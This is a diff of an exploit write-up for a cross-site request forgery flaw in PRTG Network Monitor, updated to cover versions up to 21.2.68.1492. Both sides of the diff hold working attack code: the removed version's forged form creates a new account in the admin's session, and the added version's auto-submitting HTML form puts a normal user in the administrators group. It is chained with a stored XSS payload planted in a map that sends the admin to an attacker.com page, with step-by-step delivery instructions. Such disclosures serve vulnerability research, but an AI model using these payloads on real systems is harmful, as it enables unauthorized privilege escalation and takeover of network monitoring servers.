@@ -1,123 +1,97 @@
-# PRTG Network Monitoor v20.1.55 - CSRF
-Cross Site Request Forgery (CSRF) on PRTG Network Monitor version 20.1.55
+# PRTG Network Monitoor v20.1.55 to 21.2.68.1492 - CSRF
+Cross Site Request Forgery (CSRF) on PRTG Network Monitor version 20.1.55 to 21.2.68.1492
 
-Exploit Title: Cross Site Request Forgery (CSRF)
-Date: 10/06/2021
-Exploit Author: Likhith CV
-Vendor Homepage: https://www.paessler.com/
-Software Link: https://www.paessler.com/prtg
-Test on Version: 20.1.55.1775+
-Affected Versions: not tested on other versions
+Exploit Title: Cross Site Request Forgery (CSRF)  
+Date: 10/06/2021  
+Exploit Author: Likhith CV  
+Vendor Homepage: https://www.paessler.com/  
+Software Link: https://www.paessler.com/prtg  
+Test on Version: 20.1.55.1775+ and 21.2.68.1492+    
+Affected Versions: not tested on other versions  
 
 
 ## Observation
-It was observed that anti csrf tokens are not implemented throughout PRTG Network Monitor v 20.1.55 Application
+It was observed that anti csrf tokens are not implemented in PRTG Network Monitor v20.1.55 to 21.2.68.1492
 
 Severity: High
 
 ## Steps To reproduce:
 
-To exploit this vulnerability an attacker can simply create a HTML form that would submit a user account creation request and share the link with the victim.On clicking the link , the user account creation request will be triggered in background and it shall create a user account from his valid session.
+To exploit this vulnerability normal user can simply create a HTML form that would add a normal user account to administrators group request and share the link with the victim. On clicking the link , the user account elevation request will be triggered in background and it shall create a user account from his valid session. Since this version is vulnerable to Stored XSS attacker chain XSS to CSRF
 
-Any action can be performed on behalf of logged in user but for demonstration user account creation on behalf of admin is shown as example
+Any action can be performed on behalf of logged in user but for demonstration user account privilege escalation is shown as example
 
 
 1. Create a CSRF payload as following
 ```javascript
 <html>
-  <body onload="onLoadSubmit()">
-  <script>history.pushState('', '', '/')</script>
-    <form action="https://[domain]/editsettings" name="cu2" method="POST" enctype="multipart/form-data">
-      <input type="hidden" name="login&#95;" value="User&#95;test2" />			<!--username-->
-      <input type="hidden" name="name&#95;" value="User&#95;test2" />			<!--name-->
-      <input type="hidden" name="email&#95;" value="cvlikhith&#64;gmail&#46;com" />		<!--email-->
-      <input type="hidden" name="email" value="" />
-      <input type="hidden" name="passwordradio" value="1" />
-      <input type="hidden" name="password1" value="Hello123" />				<!--password-->
-      <input type="hidden" name="password&#95;" value="" />					<!--confirm_password-->
-      <input type="hidden" name="password2" value="Hello123" />
-      <input type="hidden" name="passhash" value="" />
-      <input type="hidden" name="lastackedsensordeprecationgrowl" value="" />
-      <input type="hidden" name="usertype&#95;" value="0" />
-      <input type="hidden" name="allowack&#95;" value="0" />
-      <input type="hidden" name="allowpwchange&#95;" value="0" />
-      <input type="hidden" name="primarygroup&#95;" value="201&#124;PRTG&#32;Users&#32;Group&#124;&#124;&#124;0&#124;" />	<!--group-->
-      <input type="hidden" name="primarygroup" value="201" />
-      <input type="hidden" name="active&#95;" value="1" />
-      <input type="hidden" name="autorefreshtype&#95;" value="1" />
-      <input type="hidden" name="autorefreshinterval&#95;" value="30" />
-      <input type="hidden" name="playsound&#95;" value="0" />
-      <input type="hidden" name="homepage&#95;" value="" />
-      <input type="hidden" name="timezone&#95;" value="Dateline&#32;Standard&#32;Time&#124;&#40;UTC&#45;12&#58;00&#41;&#32;International&#32;Date&#32;Line&#32;West" />
-      <input type="hidden" name="dateformat&#95;" value="0" />
-      <input type="hidden" name="theme&#95;" value="0" />
-      <input type="hidden" name="ticketmail&#95;" value="1" />
-      <input type="hidden" name="objecttype" value="user" />
-      <input type="hidden" name="id" value="new" />
-      <input type="hidden" name="targeturl" value="&#47;systemsetup&#46;htm&#63;tabid&#61;5" />
+  <body>  
+ <form action="https://[PRTG_domain]/editsettings" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="name&#95;" value="PRTG&#32;Administrators" />
+      <input type="hidden" name="defaulthome&#95;" value="&#47;welcome&#46;htm" />
+      <input type="hidden" name="isadgroup" value="0" />
+      <input type="hidden" name="adusertype&#95;" value="0" />
+      <input type="hidden" name="aduserack&#95;" value="0" />
+      <input type="hidden" name="users&#95;" value="1" />
+      <input type="hidden" name="users&#95;" value="1" />
+      <input type="hidden" name="users&#95;&#95;check" value="[user_id]&#124;[username]&#124;" />			<!--user_id and username-->
+      <input type="hidden" name="users&#95;&#95;check" value="100&#124;PRTG&#32;System&#32;Administrator&#124;" />
+      <input type="hidden" name="id" value="200" />
+      <input type="hidden" name="targeturl" value="&#47;systemsetup&#46;htm&#63;tabid&#61;6" />
       <input type="submit" value="Submit request" />
     </form>
-	<script language="javascript">
-function onLoadSubmit() {
-	document.cu2.submit();
-}
-</script>
+    <svg/onload='document.forms[0].submit()'/> 
   </body>
 </html>
 
+
+
 ```
-2. Send this payload to admin of the PRTG Portal
-3. once Admin opens your payload new user account will be created   
+2. deliver the payload to admin of the PRTG Portal
+3. once Admin opens your payload, normal user's privilege will be elevated
+
 
 Since this version is vulnerable to stored XSS, XSS can be leverged to CSRF and used to trick admin in creating new user
+### before elevating Privileges
+![0before](https://user-images.githubusercontent.com/36541248/122039108-5f9a0180-cde7-11eb-8366-4b539992926b.png)
+
+### Get user id from source code
+![user_id](https://user-images.githubusercontent.com/36541248/122039169-6e80b400-cde7-11eb-961d-ada94074f825.png)
+
 
 ### CSRF Payload
-![payload](https://user-images.githubusercontent.com/36541248/121513665-2420c100-c9fc-11eb-819f-c83a94cba544.png)
+![image](https://user-images.githubusercontent.com/36541248/122034254-6114fb00-cde2-11eb-83ae-a0b3d0ef812e.png)
 
-### Hosting CSRF.html on attacker server
-![python_server](https://user-images.githubusercontent.com/36541248/121513670-284cde80-c9fc-11eb-8102-315033fb317f.png)
-
-### User accounts before CSRF attack
-![0](https://user-images.githubusercontent.com/36541248/121513531-005d7b00-c9fc-11eb-8346-c04737d7869f.png)
+### Hosting admin_csrf.html on attacker server
+![host_csrf_payload](https://user-images.githubusercontent.com/36541248/122034421-91f53000-cde2-11eb-8fd5-1444897e31f9.png)
 
 ### Add a Map
-![1](https://user-images.githubusercontent.com/36541248/121513573-0c493d00-c9fc-11eb-8270-23b62fb7debf.png)
+![2add_map1](https://user-images.githubusercontent.com/36541248/122038569-cc60cc00-cde6-11eb-9ebe-b439d73d3411.png)
 
 ### Enter any name and select allow publilc access (so that our XSS payload is publically accessible)
-![2](https://user-images.githubusercontent.com/36541248/121513586-0e130080-c9fc-11eb-8e54-6c3ea52e5be7.png)
+![3add_map2](https://user-images.githubusercontent.com/36541248/122038633-dc78ab80-cde6-11eb-850f-08ce1a50b800.png)
 
-### Go to Map Designer 
-![3](https://user-images.githubusercontent.com/36541248/121513597-110df100-c9fc-11eb-8b12-654965eb2f11.png)
 
-### Drag and Drop a Icon 
-![4](https://user-images.githubusercontent.com/36541248/121513601-12d7b480-c9fc-11eb-86ae-96d6e4aa6082.png)
-
-### Enter XSS payload in After HTML
-![5](https://user-images.githubusercontent.com/36541248/121513612-15d2a500-c9fc-11eb-9c5b-05d7135e2785.png)
+### Go to Map Designer --> Drag and Drop a Icon --> Enter XSS payload in After HTML
 
 ```javascript
-<img src=x onerror=document.location.href="http://[attacker_domain]/CSRF.html"//">
+<img src=x onerror=document.location.href="http://attacker.com/admin_csrf.html"//">
 
 ```
-![6](https://user-images.githubusercontent.com/36541248/121513621-179c6880-c9fc-11eb-9978-c76a6073b4e3.png)
+
+![4add_map3](https://user-images.githubusercontent.com/36541248/122038644-e0a4c900-cde6-11eb-8421-ee3a87497f71.png)
 
 ### Click on Save
-![7](https://user-images.githubusercontent.com/36541248/121513630-1a975900-c9fc-11eb-92b0-da239afb8664.png)
 
 ### New Map with XSS payload is created
-![8](https://user-images.githubusercontent.com/36541248/121513635-1bc88600-c9fc-11eb-8297-27d7dec6c4eb.png)
+![map_created](https://user-images.githubusercontent.com/36541248/122039511-cf0ff100-cde7-11eb-9ea3-531412c40944.png)
+
+### Once Admin Logs in, he is displayed with malicious map created by normal user
+![all_maps_disaplayed_on_admin](https://user-images.githubusercontent.com/36541248/122038939-32e5ea00-cde7-11eb-955a-3733fe44f5b0.png)
+
 
 ### Once the Admin Opens map CSRF Payload is triggered and new user account "user_test2" is created
-![9](https://user-images.githubusercontent.com/36541248/121513559-07848900-c9fc-11eb-8ae9-4ea660d2a35a.png)
-
-### Testing Credentials
-![testing_creds](https://user-images.githubusercontent.com/36541248/121513678-2aaf3880-c9fc-11eb-9d3b-82edacd809a7.png)
-
-### Logged In 
-![logged_in](https://user-images.githubusercontent.com/36541248/121513653-2125d080-c9fc-11eb-9285-fde0942c83e1.png)
-
-
-
+![5after](https://user-images.githubusercontent.com/36541248/122038971-3aa58e80-cde7-11eb-908a-78bdfa40b638.png)
 
 
 
